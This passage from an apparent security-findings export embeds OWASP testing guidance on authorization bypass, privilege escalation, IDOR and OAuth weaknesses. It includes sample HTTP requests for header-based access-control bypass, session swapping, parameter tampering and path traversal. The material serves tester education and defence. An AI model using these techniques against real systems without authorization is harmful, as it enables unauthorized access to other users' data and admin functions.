function:\n\n\u0060\u0060\u0060\nPOST /account/viewSettings HTTP/1.1\nHost: www.example.com\n[other HTTP headers]\nCookie: SessionID=USER_SESSION\n\nusername=example_user\n\u0060\u0060\u0060\n\nValid and legitimate response:\n\n\u0060\u0060\u0060\nHTTP1.1 200 OK\n[other HTTP headers]\n\n{\n  \u0022username\u0022: \u0022example_user\u0022,\n  \u0022email\u0022: \u0022example@email.com\u0022,\n  \u0022address\u0022: \u0022Example Address\u0022\n}\n\u0060\u0060\u0060\n\nThe attacker may try and execute that request with the same \u0060username\u0060 parameter:\n\n\u0060\u0060\u0060\nPOST /account/viewCCpincode HTTP/1.1\nHost: www.example.com\n[other HTTP headers]\nCookie: SessionID=ATTACKER_SESSION\n\nusername=example_user\n\u0060\u0060\u0060\n\nIf the attacker\u2019s response contain the data of the \u0060example_user\u0060, then the application is vulnerable for lateral movement attacks, where a user can read or write other user\u2019s data.\n\n### Testing for Access to Administrative Functions\n\nFor example, suppose that the \u0060addUser\u0060 function is part of the administrative menu of the application, and it is possible to access it by requesting the following URL \u0060https://www.example.com/admin/addUser\u0060.\nThen, the following HTTP request is generated when calling the \u0060addUser\u0060 function:\n\n\u0060\u0060\u0060\nPOST /admin/addUser HTTP/1.1\nHost: www.example.com\n[...]\n\nuserID=fakeuser\u0026role=3\u0026group=grp001\n\u0060\u0060\u0060\n\nFurther questions or considerations would go in the following direction:\n\n* What happens if a non-administrative user tries to execute that request?\n* Will the user be created?\n* If so, can the new user use their privileges?\n\n### Testing for Access to Resources Assigned to a Different Role\n\nVarious applications setup resource controls based on user roles. Let\u2019s take an example resumes or CVs (curriculum vitae) uploaded on a careers form to an S3 bucket.\nAs a normal user, try accessing the location of those files. If you are able to retrieve them, modify them, or delete them, then the application is vulnerable.\n\n### Testing for Special Request Header Handling\n\nSome applications support non-standard headers such as \u0060X-Original-URL\u0060 or \u0060X-Rewrite-URL\u0060 in order to allow overriding the target URL in requests with the one specified in the header value.\nThis behavior can be leveraged in a situation in which the application is behind a component that applies access control restriction based on the request URL.\nThe kind of access control restriction based on the request URL can be, for example, blocking access from internet to an administration console exposed on \u0060/console\u0060 or \u0060/admin\u0060.\nTo detect the support for the header \u0060X-Original-URL\u0060 or \u0060X-Rewrite-URL\u0060, the following steps can be applied.\n\n#### 1\\. Send a Normal Request without Any X\\-Original\\-Url or X\\-Rewrite\\-Url Header\n\n\u0060\u0060\u0060\nGET / HTTP/1.1\nHost: www.example.com\n[...]\n\u0060\u0060\u0060\n\n#### 2\\. Send a Request with an X\\-Original\\-Url Header Pointing to a Non\\-Existing Resource\n\n\u0060\u0060\u0060\nGET / HTTP/1.1\nHost: www.example.com\nX-Original-URL: /donotexist1\n[...]\n\u0060\u0060\u0060\n\n#### 3\\. Send a Request with an X\\-Rewrite\\-Url Header Pointing to a Non\\-Existing Resource\n\n\u0060\u0060\u0060\nGET / HTTP/1.1\nHost: www.example.com\nX-Rewrite-URL: /donotexist2\n[...]\n\u0060\u0060\u0060\n\nIf the response for either request contains markers that the resource was not found, this indicates that the application supports the special request headers. These markers may include the HTTP response status code 404, or a \u201Cresource not found\u201D message in the response body.\nOnce the support for the header \u0060X-Original-URL\u0060 or \u0060X-Rewrite-URL\u0060 was validated then the tentative of bypass against the access control restriction can be leveraged by sending the expected request to the application but specifying a URL \u201Callowed\u201D by the frontend component as the main request URL and specifying the real target URL in the \u0060X-Original-URL\u0060 or \u0060X-Rewrite-URL\u0060 header depending on the one supported. If both are supported then try one after the other to verify for which header the bypass is effective.\n\n#### 4\\. Other Headers to Consider\n\nOften admin panels or administrative related bits of functionality are only accessible to clients on local networks, therefore it may be possible to abuse various proxy or forwarding related HTTP headers to gain access. Some headers and values to test with are:\n\n* Headers:\n    * \u0060X-Forwarded-For\u0060\n    * \u0060X-Forward-For\u0060\n    * \u0060X-Remote-IP\u0060\n    * \u0060X-Originating-IP\u0060\n    * \u0060X-Remote-Addr\u0060\n    * \u0060X-Client-IP\u0060\n* Values\n    * \u0060127.0.0.1\u0060 (or anything in the \u0060127.0.0.0/8\u0060 or \u0060::1/128\u0060 address spaces)\n    * \u0060localhost\u0060\n    * Any [RFC1918](https://tools.ietf.org/html/rfc1918) address:\n        * \u006010.0.0.0/8\u0060\n        * \u0060172.16.0.0/12\u0060\n        * \u0060192.168.0.0/16\u0060\n    * Link local addresses: \u0060169.254.0.0/16\u0060\n\nNote: Including a port element along with the address or hostname may also help bypass edge protections such as web application firewalls, etc. For example: \u0060127.0.0.4:80\u0060, \u0060127.0.0.4:443\u0060, \u0060127.0.0.4:43982\u0060\n\n## Tools\n\n* [Zed Attack Proxy (ZAP)](https://www.zaproxy.org/)\n    * [ZAP add-on: Access Control Testing](https://www.zaproxy.org/docs/desktop/addons/access-control-testing/)\n* [Port Swigger Burp Suite](https://portswigger.net/burp)\n    * [Burp extension: AuthMatrix](https://github.com/SecurityInnovation/AuthMatrix/)\n    * [Burp extension: Autorize](https://github.com/Quitten/Autorize)","Details":null,"Implication":null,"Recommendation":null,"References":"## References\n\n[OWASP Application Security Verification Standard 4.0.1](https://github.com/OWASP/ASVS/tree/master/4.0), v4.0.1-1, v4.0.1-4, v4.0.1-9, v4.0.1-16","Reference":null,"Vendor":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/02-Testing_for_Bypassing_Authorization_Schema","Product":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/02-Testing_for_Bypassing_Authorization_Schema","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","comments":"","logged_in":"SaltMiner","influencers":"[]","approvers":"Grace Hopper","risk":"10","fix_by":"6/13/2024","hours_to_find":"1","developer_note":""}},"Asset":{"AppVersion":"3.0.1","Name":"05-Authorization Testing","Description":"05-Authorization Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"de1d0fac-b799-452f-946f-17a41cf48092","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-ATHZ-03 Testing for Privilege Escalation","Severity":"High","FoundDate":"2024-06-13T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/03-Testing_for_Privilege_Escalation","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/03-Testing_for_Privilege_Escalation","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"## Summary\n\nThis section describes the issue of escalating privileges from one stage to another. During this phase, the tester should verify that it is not possible for a user to modify their privileges or roles inside the application in ways that could allow privilege escalation attacks.\nPrivilege escalation occurs when a user gets access to more resources or functionality than they are normally allowed, and such elevation or changes should have been prevented by the application. This is usually caused by a flaw in the application. The result is that the application performs actions with more privileges than those intended by the developer or system administrator.\nThe degree of escalation depends on what privileges the attacker is authorized to possess, and what privileges can be obtained in a successful exploit. For example, a programming error that allows a user to gain extra privilege after successful authentication limits the degree of escalation, because the user is already authorized to hold some privilege. Likewise, a remote attacker gaining superuser privilege without any authentication presents a greater degree of escalation.\nUsually, people refer to *vertical escalation* when it is possible to access resources granted to more privileged accounts (e.g., acquiring administrative privileges for the application), and to *horizontal escalation* when it is possible to access resources granted to a similarly configured account (e.g., in an online banking application, accessing information related to a different user).","TestingInstructions":"## Test Objectives\n\n* Identify injection points related to privilege manipulation.\n* Fuzz or otherwise attempt to bypass security measures.\n\n## How to Test\n\n### Testing for Role/Privilege Manipulation\n\nIn every portion of the application where a user can create information in the database (e.g., making a payment, adding a contact, or sending a message), can receive information (statement of account, order details, etc.), or delete information (drop users, messages, etc.), it is necessary to record that functionality. The tester should try to access such functions as another user in order to verify if it is possible to access a function that should not be permitted by the user\u2019s role/privilege (but might be permitted as another user).\n\n#### Manipulation of User Group\n\nFor example: The following HTTP POST allows the user that belongs to \u0060grp001\u0060 to access order #0001:\n\n\u0060\u0060\u0060\nPOST /user/viewOrder.jsp HTTP/1.1\nHost: www.example.com\n...\n\ngroupID=grp001\u0026orderID=0001\n\u0060\u0060\u0060\n\nVerify if a user that does not belong to \u0060grp001\u0060 can modify the value of the parameters \u0060groupID\u0060 and \u0060orderID\u0060 to gain access to that privileged data.\n\n#### Manipulation of User Profile\n\nFor example: The following server\u2019s answer shows a hidden field in the HTML returned to the user after a successful authentication.\n\n\u0060\u0060\u0060\nHTTP/1.1\u00A0200\u00A0OK\nServer:\u00A0Netscape-Enterprise/6.0\nDate:\u00A0Wed,\u00A01\u00A0Apr\u00A02006\u00A013:51:20\u00A0GMT\nSet-Cookie:\u00A0USER=aW78ryrGrTWs4MnOd32Fs51yDqp;\u00A0path=/;\u00A0domain=www.example.com\nSet-Cookie:\u00A0SESSION=k\u002BKmKeHXTgDi1J5fT7Zz;\u00A0path=/;\u00A0domain=\u00A0www.example.com\nCache-Control:\u00A0no-cache\nPragma:\u00A0No-cache\nContent-length:\u00A0247\nContent-Type:\u00A0text/html\nExpires:\u00A0Thu,\u00A001\u00A0Jan\u00A01970\u00A000:00:00\u00A0GMT\nConnection:\u00A0close\n\n\u003Cform  name=\u0022autoriz\u0022 method=\u0022POST\u0022 action = \u0022visual.jsp\u0022\u003E\n\u003Cinput type=\u0022hidden\u0022 name=\u0022profile\u0022 value=\u0022SysAdmin\u0022\u003E\\\n\n\u003Cbody onload=\u0022document.forms.autoriz.submit()\u0022\u003E\n\u003C/td\u003E\n\u003C/tr\u003E\n\u0060\u0060\u0060\n\nWhat if the tester modifies the value of the variable \u0060profile\u0060 to \u0060SysAdmin\u0060? Is it possible to become **administrator**?\n\n#### Manipulation of Condition Value\n\nFor example: In an environment where the server sends an error message contained as a value in a specific parameter in a set of answer codes, as the following:\n\n\u0060\u0060\u0060\n@0\u00601\u00603\u00603\u0060\u00600\u0060UC\u00601\u0060Status\u0060OK\u0060SEC\u00605\u00601\u00600\u0060ResultSet\u00600\u0060PVValid\u0060-1\u00600\u00600\u0060 Notifications\u00600\u00600\u00603\u0060Command  Manager\u00600\u00600\u00600\u0060 StateToolsBar\u00600\u00600\u00600\u0060\nStateExecToolBar\u00600\u00600\u00600\u0060FlagsToolBar\u00600\n\u0060\u0060\u0060\n\nThe server gives an implicit trust to the user. It believes that the user will answer with the above message closing the session.\nIn this condition, verify that it is not possible to escalate privileges by modifying the parameter values. In this particular example, by modifying the \u0060PVValid\u0060 value from \u0060-1\u0060 to \u00600\u0060 (no error conditions), it may be possible to authenticate as administrator to the server.\n\n#### Manipulation of IP Address\n\nSome sites limit access or count the number of failed login attempts based on IP address.\nFor example:\n\n\u0060\u0060\u0060\nX-Forwarded-For:\u00A08.1.1.1\n\u0060\u0060\u0060\n\nIn this case, if the site uses the value of \u0060X-forwarded-For\u0060 as client IP address, tester may change the IP value of the \u0060X-forwarded-For\u0060 HTTP header to workaround the IP source identification.\n\n### Testing for Vertical Bypassing Authorization Schema\n\nA vertical authorization bypass is specific to the case that an attacker obtains a role higher than their own. Testing for this bypass focuses on verifying how the vertical authorization schema has been implemented for each role. For every function, page, specific role, or request that the application executes, it is necessary to verify if it is possible to:\n\n* Access resources that should be accessible only to a higher role user.\n* Operate functions on resources that should be operative only by a user that holds a higher or specific role identity.\n\nFor each role:\n\n1. Register a user.\n2. Establish and maintain two different sessions based on the two different roles.\n3. For every request, change the session identifier from the original to another role\u2019s session identifier and evaluate the responses for each.\n4. An application will be considered vulnerable if the weaker privileged session contains the same data, or indicate successful operations on higher privileged functions.\n\n#### Banking Site Roles Scenario\n\nThe following table illustrates the system roles on a banking site. Each role binds with specific permissions for the event menu functionality:\n\n| ROLE | PERMISSION | ADDITIONAL PERMISSION |\n| ---- | ---------- | --------------------- |\n| Administrator | Full Control | Delete |\n| Manager | Modify, Add, Read | Add |\n| Staff | Read, Modify | Modify |\n| Customer | Read Only |  |\n\nThe application will be considered vulnerable if the:\n\n1. Customer could operate administrator, manager or staff functions;\n2. Staff user could operate manager or administrator functions;\n3. Manager could operate administrator functions.\n\nSuppose that the \u0060deleteEvent\u0060 function is part of the administrator account menu of the application, and it is possible to access it by requesting the following URL: \u0060https://www.example.com/account/deleteEvent\u0060. Then, the following HTTP request is generated when calling the \u0060deleteEvent\u0060 function:\n\n\u0060\u0060\u0060\nPOST /account/deleteEvent HTTP/1.1\nHost: www.example.com\n[other HTTP headers]\nCookie: SessionID=ADMINISTRATOR_USER_SESSION\n\nEventID=1000001\n\u0060\u0060\u0060\n\nThe valid response:\n\n\u0060\u0060\u0060\nHTTP/1.1 200 OK\n[other HTTP headers]\n\n{\u0022message\u0022: \u0022Event was deleted\u0022}\n\u0060\u0060\u0060\n\nThe attacker may try and execute the same request:\n\n\u0060\u0060\u0060\nPOST /account/deleteEvent HTTP/1.1\nHost: www.example.com\n[other HTTP headers]\nCookie: SessionID=CUSTOMER_USER_SESSION\n\nEventID=1000002\n\u0060\u0060\u0060\n\nIf the response of the attacker\u2019s request contains the same data \u0060{\u0022message\u0022: \u0022Event was deleted\u0022}\u0060 the application is vulnerable.\n\n#### Administrator Page Access\n\nSuppose that the administrator menu is part of the administrator account.\nThe application will be considered vulnerable if any role other than administrator could access the administrator menu. Sometimes, developers perform authorization validation at the GUI level only, and leave the functions without authorization validation, thus potentially resulting in a vulnerability.\n\n### URL Traversal\n\nTry to traverse the site and check if some of pages that may miss the authorization check.\nFor example:\n\n\u0060\u0060\u0060\n/../.././userInfo.html\n\u0060\u0060\u0060\n\n### WhiteBox\n\nIf the URL authorization check is only done by partial URL match, then it\u2019s likely testers or hackers may workaround the authorization by URL encoding techniques.\nFor example:\n\n\u0060\u0060\u0060\nstartswith(),\u00A0endswith(),\u00A0contains(),\u00A0indexOf()\n\u0060\u0060\u0060\n\n### Weak SessionID\n\nWeak Session ID has algorithm may be vulnerable to brute force attack. For example, one site is using \u0060MD5(Password \u002B UserID)\u0060 as sessionID. Then, testers may guess or generate the sessionID for other users.\n\n## Tools\n\n* [Zed Attack Proxy (ZAP)](https://www.zaproxy.org/)","Details":null,"Implication":null,"Recommendation":"## References\n\n### Whitepapers\n\n* [Wikipedia - Privilege Escalation](https://en.wikipedia.org/wiki/Privilege_escalation)","References":null,"Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","comments":"","logged_in":"SaltMiner","influencers":"[]","approvers":"Grace Hopper","risk":"10","fix_by":"6/13/2024","hours_to_find":"1","developer_note":""}},"Asset":{"AppVersion":"3.0.1","Name":"05-Authorization Testing","Description":"05-Authorization Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"de1d0fac-b799-452f-946f-17a41cf48092","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-ATHZ-04 Testing for Insecure Direct Object References","Severity":"High","FoundDate":"2024-06-17T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"## Summary\n\nInsecure Direct Object References (IDOR) occur when an application provides direct access to objects based on user-supplied input. As a result of this vulnerability attackers can bypass authorization and access resources in the system directly, for example database records or files. Insecure Direct Object References allow attackers to bypass authorization and access resources directly by modifying the value of a parameter used to directly point to an object. Such resources can be database entries belonging to other users, files in the system, and more. This is caused by the fact that the application takes user supplied input and uses it to retrieve an object without performing sufficient authorization checks.","TestingInstructions":"## Test Objectives\n\n* Identify points where object references may occur.\n* Assess the access control measures and if they\u2019re vulnerable to IDOR.\n\n## How to Test\n\nTo test for this vulnerability the tester first needs to map out all locations in the application where user input is used to reference objects directly. For example, locations where user input is used to access a database row, a file, application pages and more. Next the tester should modify the value of the parameter used to reference objects and assess whether it is possible to retrieve objects belonging to other users or otherwise bypass authorization.\nThe best way to test for direct object references would be by having at least two (often more) users to cover different owned objects and functions. For example two users each having access to different objects (such as purchase information, private messages, etc.), and (if relevant) users with different privileges (for example administrator users) to see whether there are direct references to application functionality. By having multiple users the tester saves valuable testing time in guessing different object names as he can attempt to access objects that belong to the other user.\nBelow are several typical scenarios for this vulnerability and the methods to test for each:\n\n### The Value of a Parameter Is Used Directly to Retrieve a Database Record\n\nSample request:\n\n\u0060\u0060\u0060\nhttp://foo.bar/somepage?invoice=12345\n\u0060\u0060\u0060\n\nIn this case, the value of the *invoice* parameter is used as an index in an invoices table in the database. The application takes the value of this parameter and uses it in a query to the database. The application then returns the invoice information to the user.\nSince the value of *invoice* goes directly into the query, by modifying the value of the parameter it is possible to retrieve any invoice object, regardless of the user to whom the invoice belongs. To test for this case the tester should obtain the identifier of an invoice belonging to a different test user (ensuring he is not supposed to view this information per application business logic), and then check whether it is possible to access objects without authorization.\n\n### The Value of a Parameter Is Used Directly to Perform an Operation in the System\n\nSample request:\n\n\u0060\u0060\u0060\nhttp://foo.bar/changepassword?user=someuser\n\u0060\u0060\u0060\n\nIn this case, the value of the \u0060user\u0060 parameter is used to tell the application for which user it should change the password. In many cases this step will be a part of a wizard, or a multi-step operation. In the first step the application will get a request stating for which user\u2019s password is to be changed, and in the next step the user will provide a new password (without asking for the current one).\nThe \u0060user\u0060 parameter is used to directly reference the object of the user for whom the password change operation will be performed. To test for this case the tester should attempt to provide a different test username than the one currently logged in, and check whether it is possible to modify the password of another user.\n\n### The Value of a Parameter Is Used Directly to Retrieve a File System Resource\n\nSample request:\n\n\u0060\u0060\u0060\nhttp://foo.bar/showImage?img=img00011\n\u0060\u0060\u0060\n\nIn this case, the value of the \u0060file\u0060 parameter is used to tell the application what file the user intends to retrieve. By providing the name or identifier of a different file (for example file=image00012.jpg) the attacker will be able to retrieve objects belonging to other users.\nTo test for this case, the tester should obtain a reference the user is not supposed to be able to access and attempt to access it by using it as the value of \u0060file\u0060 parameter. Note: This vulnerability is often exploited in conjunction with a directory/path traversal vulnerability (see [Testing for Path Traversal](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/01-Testing_Directory_Traversal_File_Include))\n\n### The Value of a Parameter Is Used Directly to Access Application Functionality\n\nSample request:\n\n\u0060\u0060\u0060\nhttp://foo.bar/accessPage?menuitem=12\n\u0060\u0060\u0060\n\nIn this case, the value of the \u0060menuitem\u0060 parameter is used to tell the application which menu item (and therefore which application functionality) the user is attempting to access. Assume the user is supposed to be restricted and therefore has links available only to access to menu items 1, 2 and 3. By modifying the value of \u0060menuitem\u0060 parameter it is possible to bypass authorization and access additional application functionality. To test for this case the tester identifies a location where application functionality is determined by reference to a menu item, maps the values of menu items the given test user can access, and then attempts other menu items.\nIn the above examples the modification of a single parameter is sufficient. However, sometimes the object reference may be split between more than one parameter, and testing should be adjusted accordingly.\n\n\u003Cbr\u003E\n","Details":null,"Implication":null,"Recommendation":null,"References":"## References\n\n[Top 10 2013-A4-Insecure Direct Object References](https://owasp.org/www-project-top-ten/2017/Release_Notes)","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","hours_to_find":"1","risk":"10","logged_in":"SaltMiner","comments":"","fix_by":"6/17/2024","approvers":"Grace Hopper","influencers":"[]","developer_note":""}},"Asset":{"AppVersion":"3.0.1","Name":"05-Authorization Testing","Description":"05-Authorization Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"de1d0fac-b799-452f-946f-17a41cf48092","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-ATHZ-05 Testing for OAuth Weaknesses","Severity":"High","FoundDate":"2024-06-17T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/05-Testing_for_OAuth_Weaknesses","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/05-Testing_for_OAuth_Weaknesses","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"## Summary\n\n[OAuth2.0](https://oauth.net/2/) (hereinafter referred to as OAuth) is an authorization framework that allows a client to access resources on the behalf of its user.\nIn order to achieve this, OAuth heavily relies on tokens to communicate between the different entities, each entity having a different [role](https://datatracker.ietf.org/doc/html/rfc6749#section-1.1):\n\n* **Resource Owner:** The entity who grants access to a resource, the owner, and in most cases is the user themselves\n* **Client:** The application that is requesting access to a resource on behalf of the Resource Owner. These clients come in two [types](https://oauth.net/2/client-types/):\n    * **Public:** clients that can\u2019t protect a secret (*e.g.* frontend focused applications, such as SPAs, mobile applications, etc.)\n    * **Confidential:** clients that are able to securely authenticate with the authorization server by keeping their registered secrets safe (*e.g.* backend services)\n* **Authorization Server:** The server that holds authorization information and grants the access\n* **Resource Server:** The application that serves the content accessed by the client\n\nSince OAuth\u2019s responsibility is to delegate access rights by the owner to the client, this is a very attractive target for attackers, and bad implementations lead to unauthorized access to the users\u2019 resources and information.\nIn order to provide access to a client application, OAuth relies on several [authorization grant types](https://oauth.net/2/grant-types/) to generate an access token:\n\n* [Authorization Code](https://oauth.net/2/grant-types/authorization-code/): used by both confidential and public clients to exchange an authorization code for an access token, but recommended only for confidential clients\n* [Proof Key for Code Exchange (PKCE)](https://oauth.net/2/pkce/): PKCE builds on top of the Authorization Code grant, providing stronger security for it to be used by public clients, and improving the posture of confidential ones\n* [Client Credentials](https://oauth.net/2/grant-types/client-credentials/): used for machine to machine communication, where the \u201Cuser\u201D here is the machine requesting access to its own resources from the Resource Server\n* [Device Code](https://oauth.net/2/grant-types/device-code/): used for devices with limited input capabilities.\n* [Refresh Token](https://oauth.net/2/grant-types/refresh-token/): tokens provided by the authorization server to allow clients to refresh users\u2019 access tokens once they become invalid or expire. This grant type is used in conjunction with one other grant type.\n\nTwo flows will be deprecated in the release of [OAuth2.1](https://oauth.net/2.1/), and their usage is not recommended:\n\n* [Implicit Flow*](https://oauth.net/2/grant-types/implicit/): PKCE\u2019s secure implementation renders this flow obsolete. Prior to PKCE, the implicit flow was used by client-side applications such as [single page applications](https://en.wikipedia.org/wiki/Single-page_application) since [CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS) relaxed the [same-origin policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy) for sites to inter-communicate. For more information on why the implicit grant is not recommended, review this [section](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics#section-2.1.2).\n* [Resource Owner Password Credentials](https://oauth.net/2/grant-types/password/):used to exchange users\u2019 credentials directly with the client, which then sends them to the authorization to exchange them for an access token. For information on why this flow is not recommended, review this [section](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics#section-2.4).\n\n\\*: The implicit flow in OAuth only is deprecated, yet is still a viable solution within Open ID Connect (OIDC) to retrieve \u0060id_tokens\u0060. Be careful to understand how the implicit flow is being used, which can be identified if only the \u0060/authorization\u0060 endpoint is being used to gain an access token, without relying on \u0060/token\u0060 endpoint in any way. An example on this can be found [here](https://auth0.com/docs/get-started/authentication-and-authorization-flow/implicit-flow-with-form-post).\n*Please note that OAuth flows are a complex topic, and the above includes only a summary of the key areas. The inline references contain further information about the specific flows.*","TestingInstructions":"## Test Objectives\n\n* Determine if OAuth2 implementation is vulnerable or using a deprecated or custom implementation.\n\n## How to Test\n\n### Testing for Deprecated Grant Types\n\nDeprecated grant types were obsoleted for security and functionality reasons. Identifying if they\u2019re being used allows us to quickly review if they\u2019re susceptible to any of the threats pertaining to their usage. Some might be out of scope to the attacker, such as the way a client might be using the users\u2019 credentials. This should be documented and raised to the internal engineering teams.\nFor public clients, it is generally possible to identify the grant type in the request to the \u0060/token\u0060 endpoint. It is indicated in the token exchange with the parameter \u0060grant_type\u0060.\nThe following example shows the Authorization Code grant with PKCE.\n\n\u0060\u0060\u0060\nPOST /oauth/token HTTP/1.1\nHost: as.example.com\n[...]\n\n{\n  \u0022client_id\u0022:\u0022example-client\u0022,\n  \u0022code_verifier\u0022:\u0022example\u0022,\n  \u0022grant_type\u0022:\u0022authorization_code\u0022,\n  \u0022code\u0022:\u0022example\u0022,\n  \u0022redirect_uri\u0022:\u0022http://client.example.com\u0022\n}\n\u0060\u0060\u0060\n\nThe values for the \u0060grant_type\u0060 parameter and the grant type they indicate are:\n\n* \u0060password\u0060: Indicates the ROPC grant.\n* \u0060client_credentials\u0060: Indicates the Client Credential grant.\n* \u0060authorization_code\u0060: Indicates the Authorization Code grant.\n\nThe Implicit Flow type is not indicated by the \u0060grant_type\u0060 parameter since the token is presented in the response to the \u0060/authorization\u0060 endpoint request, and instead can be identified through the \u0060response_type\u0060. Below is an example.\n\n\u0060\u0060\u0060\nGET /authorize\n  ?client_id=\u003Csome_client_id\u003E\n  \u0026response_type=token \n  \u0026redirect_uri=https%3A%2F%2Fclient.example.com%2F\n  \u0026scope=openid%20profile%20email\n  \u0026state=\u003Crandom_state\u003E\n\u0060\u0060\u0060\n\nThe following URL parameters indicate the OAuth flow being used:\n\n* \u0060response_type=token\u0060: Indicates Implicit Flow, as the client is directly requesting from the authorization server to return a token.\n* \u0060response_type=code\u0060: Indicates Authorization Code flow, as the client is requesting from the authorization server to return a code, that will be exchanged afterwards with a token.\n* \u0060code_challenge=sha256(xyz)\u0060: Indicates the PKCE extension, as no other flow uses this parameter.\n\nThe following is an example authorization request for Authorization Code flow with PKCE:\n\n\u0060\u0060\u0060\nGET /authorize\n    ?redirect_uri=https%3A%2F%2Fclient.example.com%2F\n    \u0026client_id=\u003Csome_client_id\u003E\n    \u0026scope=openid%20profile%20email\n    \u0026response_type=code\n    \u0026response_mode=query\n    \u0026state=\u003Crandom_state\u003E\n    \u0026nonce=\u003Crandom_nonce\u003E\n    \u0026code_challenge=\u003Crandom_code_challenge\u003E\n    \u0026code_challenge_method=S256 HTTP/1.1\nHost: as.example.com\n[...]\n\u0060\u0060\u0060\n\n#### Public Clients\n\nThe Authorization Code grant with PKCE extension is recommended for public clients. An authorization request for Authorization Code flow with PKCE should contain \u0060response_type=code\u0060 and \u0060code_challenge=sha256(xyz)\u0060.\nThe token exchange should contain the grant type \u0060authorization_code\u0060 and a \u0060code_verifier\u0060.\nImproper grant types for public clients are:\n\n* Authorization Code grant without the PKCE extension\n* Client Credentials\n* Implicit Flow\n* ROPC\n\n#### Confidential Clients\n\nThe Authorization Code grant is recommended for confidential clients. The PKCE extension may be used as well.\nImproper grant types for confidential clients are:\n\n* Client Credentials (Except for machine-to-machine \u2013 see below)\n* Implicit Flow\n* ROPC\n\n##### Machine-to-Machine\n\nIn situations where no user interaction occurs and the clients are only confidential clients, the Client Credentials grant may be used.\nIf you know the \u0060client_id\u0060 and \u0060client_secret\u0060, it is possible to obtain a token by passing the \u0060client_credentials\u0060 grant type.\n\n\u0060\u0060\u0060\n$ curl --request POST \\\n  --url https://as.example.com/oauth/token \\\n  --header \u0027content-type: application/json\u0027 \\\n  --data \u0027{\u0022client_id\u0022:\u0022\u003Csome_client_id\u003E\u0022,\u0022client_secret\u0022:\u0022\u003Csome_client_secret\u003E\u0022,\u0022grant_type\u0022:\u0022client_credentials\u0022}\u0027 --proxy http://localhost:8080/ -k\n\u0060\u0060\u0060\n\n### Credential Leakage\n\nDepending on the flow, OAuth transports several types of credentials in as URL parameters.\nThe following tokens can be considered to be leaked credentials:\n\n* access token\n* refresh token\n* authorization code\n* PKCE code challenge / code verifier\n\nDue to how OAuth works, the authorization \u0060code\u0060 as well as the \u0060code_challenge\u0060, and \u0060code_verifier\u0060 may be part of the URL. The implicit flow transports the authorization token as part of the URL if the \u0060response_mode\u0060 is not set to [\u0060form_post\u0060](https://openid.net/specs/oauth-v2-form-post-response-mode-1_0.html). This may lead to leakage of the requested token or code in the referrer header, in log files, and proxies due to these parameters being passed either in the query or the fragment.\nThe risk that\u2019s carried by the implicit flow leaking the tokens is far higher than leaking the \u0060code\u0060 or any other \u0060code_*\u0060 parameters, as they are bound to specific clients and are harder to abuse in case of leakage.\nIn order to test this scenario, make use of an HTTP intercepting proxy such as ZAP and intercept the OAuth traffic.\n\n* Step through the authorization process and identify any credentials present in the URL.\n* If any external resources are included in a page involved with the OAuth flow, analyze the request made to them. Credentials could be 